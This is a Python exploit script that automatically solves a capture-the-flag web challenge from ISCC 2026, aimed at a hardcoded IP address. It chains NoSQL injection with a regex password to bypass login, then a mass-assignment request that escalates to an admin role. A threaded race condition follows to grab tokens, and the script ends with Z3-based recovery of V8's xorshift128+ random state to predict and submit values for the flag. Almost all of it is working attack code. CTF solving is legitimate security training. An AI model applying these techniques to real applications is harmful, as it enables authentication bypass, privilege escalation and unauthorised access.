#!/usr/bin/env python3
"""
八卦星图馆 - 全自动 Exploit 脚本
ISCC 2026 Web Challenge
依赖: pip install requests z3-solver
"""

import re
import requests
import z3

HOST = "http://39.105.213.28:14509"
s = requests.Session()


# ---------------------------------------------------------------------------
# Step 1: 乾卦 — NoSQL Injection
# ---------------------------------------------------------------------------
def step1_login():
    print("[*] Step 1: 乾卦 — NoSQL Injection")
    r = s.post(f"{HOST}/qian/login", json={
        "username": "qingyun",
        "password": {"$regex": ".*"}
    }, timeout=15)
    print(f"    HTTP {r.status_code}, cookies={dict(s.cookies)}")
    assert r.status_code == 200
    try:
        data = r.json()
        print(f"    role: {data.get('role', '?')}")
    except Exception:
        pass
    print("    [+] 乾卦 passed")


# ---------------------------------------------------------------------------
# Step 2: 兑卦 — Mass Assignment (role: elder / admin)
# ---------------------------------------------------------------------------
def step2_get_profile():
    """GET /dui/me to inspect current user document."""
    r = s.get(f"{HOST}/dui/me", timeout=15)
    print(f"    [/dui/me] {r.status_code} {r.text[:200]}")
    return r.json() if r.status_code == 200 else {}


def step2_set_role(role):
    """POST /dui/update to change role."""
    r = s.post(f"{HOST}/dui/update", json={"role": role}, timeout=15)
    print(f"    [/dui/update -> {role}] HTTP {r.status_code}")
    try:
        data = r.json()
        print(f"    new role: {data.get('role', '?')}")
    except Exception:
        print(f"    raw: {r.text[:200]}")
    assert r.status_code == 200
    print(f"    [+] role changed to {role}")


# ---------------------------------------------------------------------------
# Step 3: 离卦 — Race Condition (grab tokens concurrently)
# ---------------------------------------------------------------------------
def step3_grab_tokens(target=3):
    print(f"[*] Step 3: 离卦 — Race Condition (need {target} tokens)")
    # Use a fresh session specifically for the race
    import threading
    race_session = requests.Session()
    # Copy cookies from main session
    for c in s.cookies:
        race_session.cookies.set(c.name, c.value)

    tokens = []
    lock = threading.Lock()
    barrier = threading.Barrier(target * 10)  # sync all threads to fire simultaneously
    stop_flag = False

    def grab_one():
        nonlocal stop_flag
        barrier.wait()  # ALL threads wait here, then fire at once
        if stop_flag:
            return
        try:
            r = race_session.post(f"{HOST}/li/grab", timeout=15)
            if r.status_code == 200:
                tok = r.json().get("token")
                with lock:
                    if tok and tok not in tokens:
                        tokens.append(tok)
                        print(f"    token[{len(tokens)}] {tok[:40]}...")
                        if len(tokens) >= target:
                            stop_flag = True
            elif b"410" in r.content or r.status_code == 410:
                pass  # too late, already taken
        except Exception:
            pass

    # Fire a massive volley - all threads hit the server simultaneously
    n_threads = target * 10  # e.g. 30 threads for 3 tokens
    threads = [threading.Thread(target=grab_one) for _ in range(n_threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=15)

    print(f"    got {len(tokens)}/{target} tokens in volley")
    assert len(tokens) >= target, f"only got {len(tokens)} tokens"
    print(f"    [+] got {len(tokens)} tokens, using first {target}")
    return tokens[:target]


# ---------------------------------------------------------------------------
# Step 4: 震卦 — Recover xorshift128+ state & predict
# ---------------------------------------------------------------------------
def sixdigit_to_mantissa_range(n):
    """
    For a 6-digit output n from Math.floor(Math.random() * 1000000):
      mantissa = state[0] >>> 12     [52-bit integer]
      double   = mantissa / 2^52
      n = floor(double * 1000000)

    So: n <= mantissa * 1000000 / 2^52 < n+1
        n * 2^52 / 1000000 <= mantissa < (n+1) * 2^52 / 1000000
    """
    lo = (n << 52) // 1000000
    # mantissa < (n+1) * 2^52 / 1000000
    # Since mantissa is an integer: mantissa <= ceil((n+1)*2^52/1000000) - 1
    numerator = (n + 1) << 52
    hi = (numerator + 999999) // 1000000 - 1
    return lo, hi


def z3_uge(a, b):
    """unsigned greater or equal"""
    return z3.UGE(a, b)


def z3_ult(a, b):
    """unsigned less than"""
    return z3.ULT(a, b)


def xorshift128_step_z3(s0, s1, mask64):
    """Return (new_s0, new_s1) after one xorshift128+ step.
    V8 After XorShift128:
      - state transitions: [s0, s1] → [s1, f(s0,s1)]
      - output = new_state[0] >>> 12  (NOT the sum!)
    """
    ns1 = s1 ^ ((s1 << 23) & mask64)
    ns1 = ns1 ^ z3.LShR(ns1, 17)
    ns1 = ns1 ^ s0
    ns1 = ns1 ^ z3.LShR(s0, 26)
    return s1, ns1  # new state = [old_s1, new_s1], output = old_s1 >>> 12


def recover_xorshift128(history_ints):
    """
    Given 12 consecutive 6-digit integers, recover the xorshift128+ state.
    Uses range constraints instead of exact matches to handle floor() precision.
    """
    mask64 = z3.BitVecVal(0xFFFFFFFFFFFFFFFF, 64)
    s0, s1 = z3.BitVecs('s0 s1', 64)
    solver = z3.Solver()

    # Build the chain of states: each step produces one output
    # For N history values starting from initial state (s0,s1):
    #   step 0 → output history[0], new state (ns0, ns1)
    #   step 1 → output history[1], new state ...
    #   ...
    state_pairs = [(s0, s1)]
    for i in range(len(history_ints)):
        ns0, ns1 = xorshift128_step_z3(*state_pairs[-1], mask64)
        state_pairs.append((ns0, ns1))
        # Constrain: ns0 >>> 12 maps to history_ints[i]
        # V8 output = state[0] >>> 12 (NOT sum)
        lo, hi = sixdigit_to_mantissa_range(history_ints[i])
        solver.add(z3_uge(z3.LShR(ns0, 12), lo))
        solver.add(z3_ult(z3.LShR(ns0, 12), hi + 1))

    if solver.check() == z3.sat:
        m = solver.model()
        return (m[s0].as_long(), m[s1].as_long())

    # Fallback: try different starting alignments
    print("    [!] direct solve failed, trying shifted alignments...")
    for shift in range(1, 4):
        solver = z3.Solver()
        state_pairs = [(s0, s1)]
        for i in range(len(history_ints)):
            ns0, ns1 = xorshift128_step_z3(*state_pairs[-1], mask64)
            state_pairs.append((ns0, ns1))
        # Skip first `shift` outputs, match from shift+1
        for i in range(shift, min(len(history_ints), shift + 3)):
            ns0, ns1 = state_pairs[i + 1]
            lo, hi = sixdigit_to_mantissa_range(history_ints[i])
            solver.add(z3_uge(z3.LShR(ns0, 12), lo))
            solver.add(z3_ult(z3.LShR(ns0, 12), hi + 1))
        if solver.check() == z3.sat:
            m = solver.model()
            print(f"    [+] solved with shift={shift}")
            return (m[s0].as_long(), m[s1].as_long())

    return None


def xorshift128_advance(state):
    """Advance xorshift128+ state; return new state[0] (caller does >>12 for output)"""
    s0, s1 = state[0], state[1]
    mask = (1 << 64) - 1
    t = s1
    t ^= (t << 23) & mask
    t ^= (t >> 17)
    t ^= s0
    t ^= (s0 >> 26)
    state[0] = s1  # becomes old s1
    state[1] = t   # new computed value
    return state[0] & mask  # return state[0], NOT sum!


def raw_to_sixdigit(raw):
    """Convert full 64-bit state[0] to 6-digit number (uses exact integer math)"""
    mantissa = raw >> 12
    return (mantissa * 1000000) // (1 << 52)


def step4_exploit(tokens):
    print("[*] Step 4: 震卦 — Predict & Submit")

    # Fetch history
    r = s.get(f"{HOST}/zhen/history", timeout=15)
    print(f"    /zhen/history HTTP {r.status_code}")
    data = r.json()
    print(f"    keys: {list(data.keys())}")

    current_round = str(data.get("current_round", ""))
    history = data.get("history", data.get("rounds", []))
    print(f"    current_round: {current_round}")
    print(f"    history count: {len(history)}")

    # Check remaining_ms to avoid race with round rollover
    remaining_ms = data.get("remaining_ms", 99999)
    print(f"    remaining_ms: {remaining_ms}")
    if remaining_ms < 5000:
        import time
        print("    [!] too close to next round, waiting for rollover...")
        time.sleep((remaining_ms + 1000) / 1000.0)
        r = s.get(f"{HOST}/zhen/history", timeout=15)
        data = r.json()
        current_round = str(data.get("current_round", ""))
        history = data.get("history", data.get("rounds", []))
        remaining_ms = data.get("remaining_ms", 0)
        print(f"    new current_round: {current_round}, remaining_ms: {remaining_ms}")

    # Extract the 6-digit numbers from history
    history_ints_raw = []
    for item in history:
        if isinstance(item, dict) and "number" in item:
            try:
                history_ints_raw.append(int(item["number"]))
            except (ValueError, TypeError):
                pass
        elif isinstance(item, (int, float)):
            history_ints_raw.append(int(item))

    # History is newest-first (round 38,37,36,...,27)
    # Reverse so it's chronological (oldest first)
    history_ints = list(reversed(history_ints_raw))
    print(f"    extracted {len(history_ints)} history values (chronological)")
    if history_ints:
        print(f"    first 6: {history_ints[:6]}")
        print(f"    last  6: {history_ints[-6:]}")

    assert len(history_ints) >= 4, "need at least 4 history values"

    # Recover state using ALL history values
    state = recover_xorshift128(history_ints)
    if state is None:
        print("    [-] Z3 failed to recover state")
        raise RuntimeError("state recovery failed")

    print(f"    [+] recovered state: 0x{state[0]:016x} 0x{state[1]:016x}")

    # Verify by predicting the entire history
    test_state = list(state)
    verified = 0
    for i, expected in enumerate(history_ints):
        raw = xorshift128_advance(test_state)
        predicted = raw_to_sixdigit(raw)
        match = "✓" if predicted == expected else "✗"
        if predicted == expected:
            verified += 1
        else:
            if i < 5 or i >= len(history_ints) - 2:
                print(f"    verify[{i}] predicted={predicted:06d} expected={expected:06d} {match}")
    print(f"    [+] verified {verified}/{len(history_ints)} history values")

    if verified < len(history_ints):
        # Try alternative: maybe history isn't reversed correctly
        print("    [!] verification failed, trying un-reversed history...")
        state2 = recover_xorshift128(history_ints_raw)
        if state2:
            test_state2 = list(state2)
            verified2 = 0
            for expected in history_ints_raw:
                raw = xorshift128_advance(test_state2)
                predicted = raw_to_sixdigit(raw)
                if predicted == expected:
                    verified2 += 1
            print(f"    [+] un-reversed verification: {verified2}/{len(history_ints_raw)}")
            if verified2 >= verified:
                state = state2
                print("    [+] using un-reversed state")
                history_ints = history_ints_raw

    # Now predict the NEXT round's number from current state
    pred_state = list(state)
    for _ in range(len(history_ints)):
        xorshift128_advance(pred_state)

    next_raw = xorshift128_advance(pred_state)
    next_number = raw_to_sixdigit(next_raw)
    print(f"    [+] predicted next number: {next_number:06d}")

    # Submit prediction
    payload = {
        "round": current_round,
        "number": next_number,
        "tokens": tokens
    }
    print(f"    payload: round={current_round}, number={next_number:06d}, tokens={len(tokens)}")

    r = s.post(f"{HOST}/zhen/predict", json=payload, timeout=15)
    print(f"    [/zhen/predict] HTTP {r.status_code}")
    resp_text = r.text
    print(f"    response: {resp_text[:500]}")

    # If "掌门方可入" or "admin required", re-escalate
    if "掌门" in resp_text or "admin" in resp_text.lower():
        print("[*] admin role required, changing role via /dui/update...")
        step2_set_role("admin")
        r = s.post(f"{HOST}/zhen/predict", json=payload, timeout=15)
        print(f"    [/zhen/predict retry] HTTP {r.status_code}")
        resp_text = r.text
        print(f"    response: {resp_text[:500]}")

    return resp_text


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    # Step 1
    try:
        step1_login()
    except Exception as e:
        print(f"[-] Step 1 failed: {e}")
        return

    # Step 2 — set role to elder
    try:
        step2_get_profile()
        step2_set_role("elder")
    except Exception as e:
        print(f"[-] Step 2 failed: {e}")
        return

    # Step 3
    try:
        tokens = step3_grab_tokens(3)
    except Exception as e:
        print(f"[-] Step 3 failed: {e}")
        return

    # Step 4
    try:
        result = step4_exploit(tokens)
    except Exception as e:
        print(f"[-] Step 4 failed: {e}")
        return

    # Extract flag
    m = re.search(r"ISCC\{[^}]+\}", result)
    if m:
        print(f"\n{'='*50}")
        print(f"[+] FLAG: {m.group()}")
        print(f"{'='*50}")
    else:
        print(f"\n[*] Full response:\n{result[:2000]}")


if __name__ == "__main__":
    main()
